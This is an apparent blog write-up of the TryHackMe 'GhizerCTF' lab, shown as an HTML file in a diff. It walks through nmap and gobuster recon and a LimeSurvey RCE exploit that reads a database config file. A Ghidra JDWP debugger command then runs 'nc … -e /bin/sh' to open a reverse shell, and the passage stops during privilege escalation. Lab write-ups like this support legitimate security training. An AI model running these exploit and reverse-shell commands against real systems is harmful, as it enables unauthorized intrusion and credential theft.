@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en" data-theme=""><head>
+    <title> Angel Barre | Tryhackme GhizerCTF </title>
+
+    
+    <meta charset="utf-8"><meta name="generator" content="Hugo 0.74.3" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+    <meta name="description" content="Call me Skynet">
+    <meta name="google-site-verification" content="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789">
+    
+    <link rel="stylesheet"
+          href="https://skyoffc.github.io/blog/css/style.min.28b1ee64753ae7e3e46327acb742498816170bd217640dd4bf69240697a4d5e4.css"
+          integrity="sha256-KLHuZHU65&#43;PkYyest0JJiBYXC9IXZA3Uv2kkBpek1eQ="
+          crossorigin="anonymous"
+          type="text/css">
+    
+    <link rel="stylesheet"
+        href="https://skyoffc.github.io/blog/css/markupHighlight.min.9755453ffb7bc4cd220f86ebb5922107b49f193cc62fc17e9785d27b33a8bf5b.css"
+        integrity="sha256-l1VFP/t7xM0iD4brtZIhB7SfGTzGL8F&#43;l4XSezOov1s="
+        crossorigin="anonymous"
+        type="text/css">
+    
+    <link rel="stylesheet" 
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" 
+    integrity="sha512-+4zCK9k+qNFUR5X+cKL9EIR+ZOhtIloNl9GIKS57V1MyNsYpYcUrUeQc9vNfzsWfV28IaLL3i96P9sdNyeRssA==" 
+    crossorigin="anonymous" />
+
+    
+    <link rel="shortcut icon" href="https://skyoffc.github.io/blog/favicons/favicon.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://skyoffc.github.io/blog/favicons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://skyoffc.github.io/blog/favicons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://skyoffc.github.io/blog/favicons/favicon-16x16.png">
+
+    <link rel="canonical" href="https://skyoffc.github.io/blog/post/tryhackme-ghizerctf/">
+
+    
+    
+    
+    
+    <script type="text/javascript"
+            src="https://skyoffc.github.io/blog/js/anatole-header.min.e782db136ec18d105a4552702eac49f4620d6867da3fbf808bd53e806c96be6e.js"
+            integrity="sha256-54LbE27BjRBaRVJwLqxJ9GINaGfaP7&#43;Ai9U&#43;gGyWvm4="
+            crossorigin="anonymous"></script>
+    <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://skyoffc.github.io/blog/images/site-feature-image.png"/>
+
+<meta name="twitter:title" content="Tryhackme GhizerCTF"/>
+<meta name="twitter:description" content="Lucrecia has installed multiple web applications on the server."/>
+
+</head>
+<body><div class="sidebar animated fadeInDown ">
+    <div class="logo-title">
+        <div class="title">
+            <img src="https://skyoffc.github.io/blog/images/profile.png" alt="profile picture">
+            <h3 title=""><a href="/">Hi, &lt;coders/&gt;!</a></h3>
+            <div class="description">
+                <p>Call me Skynet</p>
+            </div>
+        </div>
+    </div>
+    <ul class="social-links">
+        
+            <li>
+                <a href="https://t.me/devskynet" rel="me" aria-label="Telegran">
+                    <i class="fab fa-telegram fa-2x" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            <li>
+                <a href="https://github.com/skynetoffc" rel="me" aria-label="GitHub">
+                    <i class="fab fa-github fa-2x" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            <li>
+                <a href="mailto:skynetoffc@gmail.com" rel="me" aria-label="e-mail">
+                    <i class="fas fa-envelope fa-2x" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            <li>
+                <a href="https://twitter.com/skynetoffc" rel="me" aria-label="Twitter">
+                    <i class="fab fa-twitter fa-2x" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+    </ul>
+    <div class="footer">
+        <div class="by_farbox">&copy; Angel Barre 2020 </div>
+    </div>
+</div>
+<div class="main">
+    <div class="page-top  animated fadeInDown ">
+    <a role="button" class="navbar-burger" data-target="navMenu" aria-label="menu" aria-expanded="false">
+        <span aria-hidden="true"></span>
+        <span aria-hidden="true"></span>
+        <span aria-hidden="true"></span>
+    </a>
+    <ul class="nav" id="navMenu">
+        
+        
+            
+            <li><a 
+                   href="/blog/"
+                        
+                   title="">Home</a></li>
+        
+            
+            <li><a 
+                   href="/blog/post/"
+                        
+                   title="">Posts</a></li>
+        
+            
+            <li><a 
+                   href="/blog/about/"
+                        
+                   title="">About</a></li>
+        
+            
+            <li><a 
+                   href="/blog/contact/"
+                        
+                   title="">Contact</a></li>
+        
+        
+        <li class="theme-switch-item">
+            <a class="theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+    <div class="autopagerize_page_element">
+        <div class="content">
+    <div class="post  animated fadeInDown ">
+        <div class="post-content">
+            <div class="post-title">
+                <h3>Tryhackme GhizerCTF</h3>
+                
+                    <div class="info">
+                        <em class="fas fa-calendar-day"></em>
+                        <span class="date">Wed, Dec 23, 2020</span>
+                        <em class="fas fa-stopwatch"></em>
+                        <span class="reading-time">8-minute read</span>
+                    </div>
+                
+            </div>
+
+            <p><img src="https://imgur.com/TjL3rr0.png" alt="cover"></p>
+<h2 id="-recon"># Recon</h2>
+<p>We start with a basic nmap scan to find out what ports and services we are dealing with.</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">❯ nmap -oN initial 10.10.221.248
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2020-12-23 10:36 -05
+Nmap scan report for 10.10.221.248
+Host is up (0.19s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE
+21/tcp  open  ftp
+80/tcp  open  http
+443/tcp open  https
+
+Nmap done: 1 IP address (1 host up) scanned in 14.38 seconds
+</code></pre></div><p>Quickly reviewing we look at port <strong>80</strong> that we are dealing with with something similar to a web application called <strong>LimeSurvey</strong>.
+<img src="https://imgur.com/BIPleu3.png" alt="web"></p>
+<p>Well, since we don&rsquo;t see anything interesting in port <strong>80</strong> we will do a more detailed scan with <strong>nmap</strong>.</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">PORT    STATE SERVICE  REASON  VERSION 
+21/tcp  open  ftp?     syn-ack
+80/tcp  open  http     syn-ack Apache httpd 2.4.18 ((Ubuntu))
+|_http-favicon: Unknown favicon MD5: B55AD3F0C0A029568074402CE92ACA23
+|_http-generator: LimeSurvey http://www.limesurvey.org
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title:         LimeSurvey    
+443/tcp open  ssl/http syn-ack Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| ssl-cert: Subject: commonName=ubuntu
+| Issuer: commonName=ubuntu
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2020-07-23T17:27:31
+| Not valid after:  2030-07-21T17:27:31
+| MD5:   afb1 a2b9 1183 2e49 f707 9d1a 7198 9ca3
+| SHA-1: 37f1 945f 6bc4 3fad 3f0f ca8d 3788 2c17 cc25 0792
+| -----BEGIN CERTIFICATE-----
+| MIICsjCCAZqgAwIBAgIJAIIhLFTsAdpUMA0GCSqGSIb3DQEBCwUAMBExDzANBgNV
+| BAMMBnVidW50dTAeFw0yMDA3MjMxNzI3MzFaFw0zMDA3MjExNzI3MzFaMBExDzAN
+| BgNVBAMMBnVidW50dTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALm4
+| +BEIDO1MIeQZQkUZfeEqegkSYi8IGF2zvpL2zpUOCjcpm9pFZwj/ZT8g/nbdhVpX
+| Q0z3eWzFKRRZdthTOfCtNkZjQhJlpR+Fvc7QDUHSG+ugZL0nIuQMKaniom6OVuQg
+| 3nyxPehC9eYOjovV6m3TOWVHRYMRpf54RHHwwvpHwHkJAEcg7oHwBgP/JeW3h20r
+| G/Ri8FpPZs49xYArZ15te9ofw0TUigqx03RguwKLYr+/i7+UFwmzU93+ylz/PE16
+| HVfEBAFGIY52wWkc5Pt3+B+T5HZqVLqAW8LNcxSuugiMkgV1r4QQlBgNpc026aZR
+| EG6sF9C57EOQgyBVihECAwEAAaMNMAswCQYDVR0TBAIwADANBgkqhkiG9w0BAQsF
+| AAOCAQEAXYtbViAQzTFPjlPzwItXfMsyYYkH9guFsI9l0A6/6xa6CCwklJAF1vjz
+| tpHg338NRn4CXobk9Y6aopmUsNhFwlryS5YwPQ1s5ml6GHaDQ7ijG52J4Uj1J4o5
+| nRlDgqXi8EM/Dl5cgwHBnQ3k/u3uoPp/H0jIfXK/jskVurNb/sT6Raj5TEgcgMMm
+| 8Hzj0jqSROhDZFtU93z8OCZWBaO8u+wVj0xtdHpg+X8UQalIrASlsSNn1i50lU2p
+| 0C+eASFiDrOue7gzDDO4pdYrxmG5MiRNrfKQPLv3IvT0gEgCgkulRLo//CeY1tQ9
+| 7KFSteW6LSwpqHdP08faw+/nJnfnXQ==
+|_-----END CERTIFICATE-----
+|_ssl-date: TLS randomness does not represent time
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap
+.org/cgi-bin/submit.cgi?new-service :
+SF-Port21-TCP:V=7.01%I=7%D=12/23%Time=5FE3738F%P=i686-pc-linux-gnu%r(NULL,
+SF:33,&#34;220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203
+SF:\.0\.3\)\n&#34;)%r(GenericLines,58,&#34;220\x20Welcome\x20to\x20Anonymous\x20FT
+SF:P\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\x20with\x2
+SF:0USER\x20and\x20PASS\.\n&#34;)%r(Help,58,&#34;220\x20Welcome\x20to\x20Anonymous
+SF:\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\x20w
+SF:ith\x20USER\x20and\x20PASS\.\n&#34;)%r(GetRequest,58,&#34;220\x20Welcome\x20to\
+SF:x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x
+SF:20login\x20with\x20USER\x20and\x20PASS\.\n&#34;)%r(HTTPOptions,58,&#34;220\x20W
+SF:elcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n53
+SF:0\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n&#34;)%r(RTSPRequest
+SF:,58,&#34;220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x20
+SF:3\.0\.3\)\n530\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n&#34;)%
+SF:r(RPCCheck,33,&#34;220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(
+SF:vsFTPd\x203\.0\.3\)\n&#34;)%r(DNSVersionBindReq,58,&#34;220\x20Welcome\x20to\x2
+SF:0Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20
+SF:login\x20with\x20USER\x20and\x20PASS\.\n&#34;)%r(DNSStatusRequest,58,&#34;220\x
+SF:20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\
+SF:n530\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n&#34;)%r(SSLSessi
+SF:onReq,33,&#34;220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTP
+SF:d\x203\.0\.3\)\n&#34;)%r(TLSSessionReq,33,&#34;220\x20Welcome\x20to\x20Anonymou
+SF:s\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n&#34;)%r(Kerberos,33,&#34;220\x20W
+SF:ith\x20USER\x20and\x20PASS\.\n&#34;)%r(GetRequest,58,&#34;220\x20Welcome\x20to\                                                     
+SF:x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x
+SF:20login\x20with\x20USER\x20and\x20PASS\.\n&#34;)%r(HTTPOptions,58,&#34;220\x20W
+SF:elcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n53
+SF:0\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n&#34;)%r(RTSPRequest
+SF:,58,&#34;220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x20
+SF:3\.0\.3\)\n530\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n&#34;)%
+SF:r(RPCCheck,33,&#34;220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(
+SF:vsFTPd\x203\.0\.3\)\n&#34;)%r(DNSVersionBindReq,58,&#34;220\x20Welcome\x20to\x2
+SF:0Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20
+SF:login\x20with\x20USER\x20and\x20PASS\.\n&#34;)%r(DNSStatusRequest,58,&#34;220\x
+SF:20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\
+SF:n530\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n&#34;)%r(SSLSessi
+SF:onReq,33,&#34;220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTP
+SF:d\x203\.0\.3\)\n&#34;)%r(TLSSessionReq,33,&#34;220\x20Welcome\x20to\x20Anonymou
+SF:s\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n&#34;)%r(Kerberos,33,&#34;220\x20W
+SF:elcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n&#34;)
+SF:%r(SMBProgNeg,33,&#34;220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x2
+SF:0\(vsFTPd\x203\.0\.3\)\n&#34;)%r(X11Probe,58,&#34;220\x20Welcome\x20to\x20Anony
+SF:mous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\
+SF:x20with\x20USER\x20and\x20PASS\.\n&#34;)%r(FourOhFourRequest,58,&#34;220\x20Wel
+SF:come\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\
+SF:x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n&#34;)%r(LPDString,58,
+SF:&#34;220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0
+SF:\.3\)\n530\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n&#34;);
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 11:45
+Completed NSE at 11:45, 0.00s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 11:45
+Completed NSE at 11:45, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 178.79 seconds
+
+</code></pre></div><h2 id="-ftp"># FTP</h2>
+<p>We enter through the FTP service with the credentials of anonymous <strong>anonymous: anonymous</strong> in which we find several files among them the flag <strong>root.txt</strong> and <strong>user.txt</strong>, when trying to obtain one of these files it shows a permission denied message so it does not we managed to do nothing in this service.</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-------    1 0        0            4096  Dec 12  2019 client.py
+-rwx------    1 0        0            45550 Nov 28  2019 test.c
+-rw-------    1 0        0            5513  Nov 28  2019 prototype.c
+-rw-------    1 0        0            5513  Dec 12  2019 root.txt
+-rwx------    1 0        0            1024  Nov 28  2019 user.txt
+-rw-------    1 0        0            54324 Nov 28  2019 i_honeypot.py
+226 Directory send OK.
+ftp&gt; get user.txt
+local: user.txt remote: user.txt
+Permission denied.
+200 PORT command successful. Consider using PASV.
+550 Permission denied.
+ftp&gt; get root.txt
+local: root.txt remote: root.txt
+Permission denied.
+200 PORT command successful. Consider using PASV.
+550 Permission denied.
+ftp&gt; pwd
+257 &#34;/home/lucrecia/ftp/&#34; is the current directory
+ftp&gt; bye
+221 Goodbye.
+</code></pre></div><h2 id="-http"># HTTP</h2>
+<p>As we did not get anything in the previous service we continue more thoroughly with <strong>HTTP</strong>.
+<img src="https://imgur.com/BIPleu3.png" alt="web">
+By finding out better about the service, we know that it is a survey service.</p>
+<h2 id="-gobuster"># GOBUSTER</h2>
+<p>To avoid wasting time we started fuzzing directories.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">❯  gobuster dir -u http://ghizer.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t <span class="m">50</span> -x php,html,txt -o gobuster.log
+/docs                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 307<span class="o">]</span> <span class="o">[</span>--&gt; http://ghizer.thm/docs/<span class="o">]</span>
+/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 40931<span class="o">]</span>                            
+/themes               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 309<span class="o">]</span> <span class="o">[</span>--&gt; http://ghizer.thm/themes/<span class="o">]</span>
+/assets               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 309<span class="o">]</span> <span class="o">[</span>--&gt; http://ghizer.thm/assets/<span class="o">]</span>
+/admin                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 308<span class="o">]</span> <span class="o">[</span>--&gt; http://ghizer.thm/admin/<span class="o">]</span> 
+/upload               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 309<span class="o">]</span> <span class="o">[</span>--&gt; http://ghizer.thm/upload/<span class="o">]</span>
+/tests                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 308<span class="o">]</span> <span class="o">[</span>--&gt; http://ghizer.thm/tests/<span class="o">]</span> 
+/plugins              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 310<span class="o">]</span> <span class="o">[</span>--&gt; http://ghizer.thm/plugins/<span class="o">]</span>
+/application          <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314<span class="o">]</span> <span class="o">[</span>--&gt; http://ghizer.thm/application/<span class="o">]</span>
+/tmp                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 306<span class="o">]</span> <span class="o">[</span>--&gt; http://ghizer.thm/tmp/<span class="o">]</span>        
+/framework            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312<span class="o">]</span> <span class="o">[</span>--&gt; http://ghizer.thm/framework/<span class="o">]</span>  
+/locale               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 309<span class="o">]</span> <span class="o">[</span>--&gt; http://ghizer.thm/locale/<span class="o">]</span>     
+/installer            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312<span class="o">]</span> <span class="o">[</span>--&gt; http://ghizer.thm/installer/<span class="o">]</span>  
+/third_party          <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314<span class="o">]</span> <span class="o">[</span>--&gt; http://ghizer.thm/third_party/<span class="o">]</span>
+</code></pre></div><p>When entering the directory <strong>/admin</strong> we find a login of that service when we do a search in <strong>Google</strong> about that service we find that it has default credentials, then we use them to initiate session.</p>
+<h2 id="-limesurvey---rce"># LimeSurvey - RCE</h2>
+<p>Upon entering the Administration Panel we see a list of services that we can perform together with the version of the web application service.
+<img src="https://imgur.com/xCAhPTt.png" alt="version"></p>
+<p>Doing a google search for <strong>Lime Survey version 3.15.9 exploit</strong> we found a python exploit, let&rsquo;s use the exploit with the default credentials.</p>
+<p><a href="https://www.exploit-db.com/exploits/46634">Exploit LImeSurvey RCE</a></p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">❯ python2 exploit.py http://ghizer.thm admin password
+<span class="o">[</span>*<span class="o">]</span> Logging in to LimeSurvey...
+<span class="o">[</span>*<span class="o">]</span> Creating a new Survey...
+<span class="o">[</span>+<span class="o">]</span> SurveyID: <span class="m">353418</span>
+<span class="o">[</span>*<span class="o">]</span> Uploading a malicious PHAR...
+<span class="o">[</span>*<span class="o">]</span> Sending the Payload...
+<span class="o">[</span>*<span class="o">]</span> TCPDF Response: &lt;strong&gt;TCPDF ERROR: &lt;/strong&gt;<span class="o">[</span>Image<span class="o">]</span> Unable to get the size of the image: phar://./upload/surveys/353418/files/malicious.jpg
+<span class="o">[</span>+<span class="o">]</span> Pwned! :<span class="o">)</span>
+<span class="o">[</span>+<span class="o">]</span> Getting the shell...
+$ ls
+CONTRIBUTING.md
+README.md
+admin
+application
+assets
+composer.json
+docs
+framework
+index.php
+installer
+locale
+manifest.yml
+phpci.yml
+phpunit.xml
+plugins
+shell.php
+tests
+themes
+third_party
+tmp
+upload
+
+$ cat application/config/config.php
+
+<span class="k">return</span> array<span class="o">(</span>
+        <span class="s1">&#39;components&#39;</span> <span class="o">=</span>&gt; array<span class="o">(</span>
+                <span class="s1">&#39;db&#39;</span> <span class="o">=</span>&gt; array<span class="o">(</span>
+                        <span class="s1">&#39;connectionString&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;mysql:host=localhost;port=3306;dbname=limedb;&#39;</span>,
+                        <span class="s1">&#39;emulatePrepare&#39;</span> <span class="o">=</span>&gt; true,
+                        <span class="s1">&#39;username&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;Anny&#39;</span>,
+                        <span class="s1">&#39;password&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;[REDACTED]&#39;</span>,
+                        <span class="s1">&#39;charset&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;utf8mb4&#39;</span>,
+                        <span class="s1">&#39;tablePrefix&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;lime_&#39;</span>,
+                <span class="o">)</span>,
+
+                // Uncomment the following lines <span class="k">if</span> you need table-based sessions.
+                // Note: Table-based sessions are currently not supported on MSSQL server.
+                // <span class="s1">&#39;session&#39;</span> <span class="o">=</span>&gt; array <span class="o">(</span>
+                        // <span class="s1">&#39;class&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;application.core.web.DbHttpSession&#39;</span>,
+                        // <span class="s1">&#39;connectionID&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;db&#39;</span>,
+                        // <span class="s1">&#39;sessionTableName&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;{{sessions}}&#39;</span>,
+                // <span class="o">)</span>,
+
+                <span class="s1">&#39;urlManager&#39;</span> <span class="o">=</span>&gt; array<span class="o">(</span>
+                        <span class="s1">&#39;urlFormat&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;path&#39;</span>,
+                        <span class="s1">&#39;rules&#39;</span> <span class="o">=</span>&gt; array<span class="o">(</span>
+                                // You can add your own rules here
+                        <span class="o">)</span>,
+                        <span class="s1">&#39;showScriptName&#39;</span> <span class="o">=</span>&gt; true,
+                <span class="o">)</span>,
+
+</code></pre></div><p>With the credentials obtained, log in to port <strong>443</strong> of <strong>Wordpress</strong> adding the ssl certificate
+in the wordpress installer that is in an easy path to find.
+<img src="https://i.imgur.com/lxaffW3.png" alt="wordpress">
+Since we cannot do anything in wordpress, we get rce again and this time we configure a shell in php and we build a python web server to transfer the shell to the victim machine.</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">❯ nc -nlvp <span class="m">9001</span>
+Listening on <span class="o">[</span>0.0.0.0<span class="o">]</span> <span class="o">(</span>family 0, port 9001<span class="o">)</span>
+Connection from <span class="o">[</span>10.10.221.248<span class="o">]</span> port <span class="m">9001</span> <span class="o">[</span>tcp/*<span class="o">]</span> accepted <span class="o">(</span>family 2, sport 54328<span class="o">)</span>
+Linux ubuntu 4.15.0-112-generic <span class="c1">#113~16.04.1-Ubuntu SMP Fri Jul 10 04:37:08 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 12:12:39 up  4:37,  <span class="m">1</span> user,  load average: 0.15, 0.06, 0.01
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+veronica tty7     :0               07:35    4:37m  1:38   0.13s /sbin/upstart --user
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
+$ 
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</code></pre></div><h2 id="-ghidra-rce"># GHIDRA RCE</h2>
+<p>With the command <strong>netsat -ano</strong> we can see which web services are running at first glance we see <strong>127.0.0.1:18001</strong>.
+We download and use linpeas on the victim machine and repeatedly see that Ghidra-9.0 is running
+We need remote command to execute in GhidraDebug
+We explored the vulnerabilities in ghidra and at first we saw the exploit <a href="https://www.exploit-db.com/exploits/47231">Ghidra (Linux) 9.0.4 - .gar Arbitrary Code Execution</a> that needs a <strong>project.gar</strong> file which can be created in Ghidra from a project, but this exploit needs a interaction with the visual interface of Ghidra. We also found the Remote Code Execution Through JDWP Debug Port vulnerability which affects version 9.0.4. In this vulnerability, Ghidra opens JDWP in debug mode, which allows it to connect to port <strong>18001</strong> of localhost,We have access to the port (18001) locally with the current shell so we carry out the exploitation.</p>
+<h2 id="-commands-rce-ghidra"># Commands RCE Ghidra</h2>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">// Connection to jdwp
+
+jdb -attach localhost:18001
+
+// List available classes
+// classpath
+
+stop in org.apache.logging.log4j.core.util.WatchManager<span class="nv">$WatchRunnable</span>.run<span class="o">()</span>
+
+// Execution of the reverse shell
+
+print new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&#34;nc iptun0 1337 -e /bin/sh&#34;</span><span class="o">)</span>
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">❯ nc -nlvp <span class="m">4444</span>
+Listening on <span class="o">[</span>0.0.0.0<span class="o">]</span> <span class="o">(</span>family 0, port 4444<span class="o">)</span>
+Connection from <span class="o">[</span>10.10.221.248<span class="o">]</span> port <span class="m">4444</span> <span class="o">[</span>tcp/*<span class="o">]</span> accepted <span class="o">(</span>family 2, sport 49890<span class="o">)</span>
+id
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>veronica<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>veronica<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>veronica<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,113<span class="o">(</span>lpadmin<span class="o">)</span>,128<span class="o">(</span>sambashare<span class="o">)</span>
+python -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+veronica@ubuntu:~$ cat user.txt
+</code></pre></div><p>We managed to get our flag <strong>user.txt</strong> and a shell with the user <strong>Veronica</strong>.</p>
+<h2 id="-privilege-escalation"># PRIVILEGE ESCALATION</h2>
+<p>We do a small enumeration in <strong>Veronica&rsquo;s</strong> main folder and we see a python script which encodes the <strong>tryhackme is the best</strong> message and also the variable could give us a clue of what we should do.</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">base64</span>
+
+<span class="n">hijackme</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;tryhackme is the best&#39;</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">hijackme</span><span class="p">)</span>
+</code></pre></div><p>We also see a cron that the root user executes.</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">veronica@ubuntu:~$ cat /etc/crontab
+cat /etc/crontab
+<span class="c1"># /etc/crontab: system-wide crontab</span>
+<span class="c1"># Unlike any other crontab you don&#39;t have to run the `crontab&#39;</span>
+<span class="c1"># command to install the new version when you edit this file</span>
+<span class="c1"># and files in /etc/cron.d. These files also have username fields,</span>
+<span class="c1"># that none of the other crontabs do.</span>
+
+<span class="nv">SHELL</span><span class="o">=</span>/bin/sh
+<span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+<span class="c1"># m h dom mon dow user  command</span>
+<span class="m">17</span> *    * * *   root    <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts --report /etc/cron.hourly
+<span class="m">25</span> <span class="m">6</span>    * * *   root    <span class="nb">test</span> -x /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts --report /etc/cron.daily <span class="o">)</span>
+<span class="m">47</span> <span class="m">6</span>    * * <span class="m">7</span>   root    <span class="nb">test</span> -x /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts --report /etc/cron.weekly <span class="o">)</span>
